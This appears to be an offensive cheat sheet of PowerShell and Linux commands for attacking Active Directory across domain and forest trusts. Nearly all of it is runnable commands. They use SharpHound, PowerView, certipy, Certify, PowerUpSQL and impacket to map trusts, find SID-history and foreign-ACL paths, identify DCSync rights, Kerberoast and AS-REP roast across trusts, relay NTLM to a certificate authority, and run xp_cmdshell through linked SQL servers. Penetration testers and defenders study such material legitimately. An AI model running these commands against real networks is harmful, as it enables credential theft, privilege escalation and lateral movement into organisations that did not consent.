**BloodHound/SharpHound first — collect across trusts:**

powershell

```powershell
# Collect all reachable domains (follows trusts automatically)
SharpHound.exe -c All,GPOLocalGroup --collectallproperties -d parent.local
SharpHound.exe -c All,GPOLocalGroup --collectallproperties -d child.parent.local
SharpHound.exe -c All,GPOLocalGroup --collectallproperties -d partner.corp

# If you have creds for the foreign forest
SharpHound.exe -c All --collectallproperties -d foreign.forest --ldapusername user --ldappassword pass

# Session loop (catch admins authenticating across trust boundaries)
SharpHound.exe -c Session --loop --loopduration 04:00:00
```

**Trust enumeration — the foundation:**

powershell

```powershell
# PowerView - map all trusts and their properties
Get-DomainTrust
Get-DomainTrust -Domain foreign.forest
Get-ForestDomain                          # all domains in current forest
Get-ForestDomain -Forest foreign.forest   # all domains in foreign forest
Get-DomainTrustMapping                    # recursive trust mapping

# Key attributes to note:
# TrustDirection: Bidirectional, Inbound, Outbound
# TrustType: External, Forest, ParentChild
# TrustAttributes: FILTER_SIDS, TREAT_AS_EXTERNAL, WITHIN_FOREST

# netdom from a DC
netdom trust /d:parent.local foreign.forest /verify
nltest /domain_trusts /all_trusts /v

# Check if SID filtering is actually enabled (critical)
netdom trust parent.local /d:foreign.forest /quarantine
```

**SID filtering and SID history — the key question:**

powershell

```powershell
# Find users with SID history (golden ticket cross-forest path)
Get-DomainUser -LDAPFilter '(sidHistory=*)' | Select samaccountname, sidhistory
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain child.parent.local

# Find groups with foreign members
Get-DomainForeignGroupMember
Get-DomainForeignGroupMember -Domain foreign.forest
Get-DomainForeignUser
Get-DomainForeignUser -Domain foreign.forest

# Check for SIDs from other domains in local groups
Get-DomainGroup -Domain parent.local | Get-DomainGroupMember | ? {
    $_.MemberDomain -ne "parent.local"
}
```

**Foreign ACL abuse — what BloodHound often misses:**

powershell

```powershell
# Find ACLs where foreign principals have rights
# This is the big one - foreign users/groups with GenericAll, WriteDACL, etc.
Find-InterestingDomainAcl -Domain parent.local -ResolveGUIDs | ? {
    $_.IdentityReferenceDomain -ne "parent.local"
}

# Foreign principals in privileged groups
Get-DomainGroup "Domain Admins" -Domain foreign.forest | Get-DomainGroupMember
Get-DomainGroup "Enterprise Admins" | Get-DomainGroupMember
Get-DomainGroup "Administrators" -Domain child.parent.local | Get-DomainGroupMember

# Check who can DCSync in each domain
Get-DomainObjectAcl "DC=parent,DC=local" -ResolveGUIDs | ? {
    ($_.ObjectAceType -match 'Replicating') -and
    ($_.SecurityIdentifier -match 'S-1-5-21')
} | Select SecurityIdentifier, ObjectAceType
```

**ADCS across trusts — certipy is king here:**

bash

```bash
# Enumerate CAs and templates visible cross-forest
certipy find -u user@parent.local -p 'Pass' -dc-ip DC_IP -enabled

# Check if foreign forest users can enroll in templates (ESC1 cross-forest)
# Look for: Enrollee Supplies Subject = True + foreign enrollment rights
certipy find -u user@parent.local -p 'Pass' -dc-ip DC_IP -vulnerable

# If CA web enrollment is enabled (ESC8 cross-forest)
# Foreign users can relay NTLM to the CA
certipy relay -ca CA_IP -template DomainController
```

powershell

```powershell
# Certify from Windows
Certify.exe find /vulnerable
Certify.exe find /ca:foreign-CA.foreign.forest

# Check enrollment rights for foreign principals
Certify.exe find /enrolleeSuppliesSubject
```

**Kerberos across trusts:**

powershell

```powershell
# Kerberoastable accounts visible cross-trust
Get-DomainUser -SPN -Domain foreign.forest
Get-DomainUser -SPN -Domain child.parent.local

# AS-REP roastable across trust
Get-DomainUser -PreauthNotRequired -Domain foreign.forest

# Check for unconstrained delegation in foreign domains
# (can capture TGTs from users authenticating across trust)
Get-DomainComputer -Unconstrained -Domain foreign.forest
Get-DomainComputer -Unconstrained -Domain parent.local | ? { -not $_.distinguishedname -match "Domain Controllers" }

# Constrained delegation targeting foreign services
Get-DomainUser -TrustedToAuth -Domain parent.local
Get-DomainComputer -TrustedToAuth -Domain parent.local
# Look for msds-allowedtodelegateto pointing to foreign domain SPNs
```

**MSSQL trust hopping:**

powershell

```powershell
# SQL servers are often linked across forests
# From PowerUpSQL:
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance db01.parent.local -Verbose

# If linked servers span forests, you can execute across the trust
# Check for xp_cmdshell on linked servers in foreign domain
Get-SQLServerLinkCrawl -Instance db01.parent.local -Query "exec master..xp_cmdshell 'whoami'"
```

**Manual LDAP checks for things everyone forgets:**

powershell

```powershell
# PAM trust (privileged access management) - rare but powerful
Get-ADTrust -Filter {TrustAttributes -band 0x400}

# Schema admins / enterprise admins from child → parent
Get-DomainGroupMember "Schema Admins" -Domain parent.local
Get-DomainGroupMember "Enterprise Admins" -Domain parent.local

# GPOs linked across domains (rare but it happens)
Get-DomainGPO -Domain parent.local | ? { $_.gpcfilesyspath -match "foreign" }

# DNS zones - conditional forwarders reveal trust relationships
Get-DomainDNSZone
dnscmd /enumzones
# Check for _msdcs zones from foreign forests

# AdminSDHolder - check if foreign SIDs are protected
Get-DomainObjectAcl "CN=AdminSDHolder,CN=System,DC=parent,DC=local" -ResolveGUIDs
```

**From Linux with impacket:**

bash

```bash
# Trust enumeration
rpcclient -U 'user%Pass' DC_IP -c "dsr_enumtrustdom"
rpcclient -U 'user%Pass' DC_IP -c "lsaenumtrustdoms"

# Foreign domain users with SID resolution
lookupsid.py parent.local/user:'Pass'@DC_IP 20000

# Kerberoast across trust
GetUserSPNs.py -target-domain foreign.forest parent.local/user:'Pass' -dc-ip DC_IP

# Dump foreign domain info via LDAP
ldapdomaindump -u 'parent.local\user' -p 'Pass' FOREIGN_DC_IP -o foreign_dump/
```